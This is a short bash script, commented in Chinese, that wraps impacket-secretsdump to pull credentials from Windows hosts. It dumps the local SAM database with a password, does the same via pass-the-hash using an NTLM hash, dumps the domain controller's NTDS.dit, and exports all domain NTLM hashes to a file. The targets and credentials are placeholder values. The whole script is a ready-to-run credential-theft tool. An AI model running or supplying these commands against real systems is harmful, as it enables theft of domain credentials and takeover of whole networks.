#!/bin/bash
# secretsdump 远程凭据转储脚本

TARGET="192.168.1.100"
DOMAIN="corp"
USER="administrator"
PASS="Password123!"
HASH="aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
DC_IP="192.168.1.10"

echo "[*] 使用密码远程转储 SAM"
impacket-secretsdump ${DOMAIN}/${USER}:${PASS}@${TARGET}

echo ""
echo "[*] 使用哈希 PTH 远程转储"
impacket-secretsdump -hashes ${HASH} ${DOMAIN}/${USER}@${TARGET}

echo ""
echo "[*] 转储域控 NTDS.dit（需要域管权限）"
impacket-secretsdump -just-dc ${DOMAIN}/${USER}:${PASS}@${DC_IP}

echo ""
echo "[*] 仅导出 NTLM 哈希（CSV 格式）"
impacket-secretsdump -just-dc-ntlm ${DOMAIN}/${USER}:${PASS}@${DC_IP} \
    -outputfile ntds_hashes
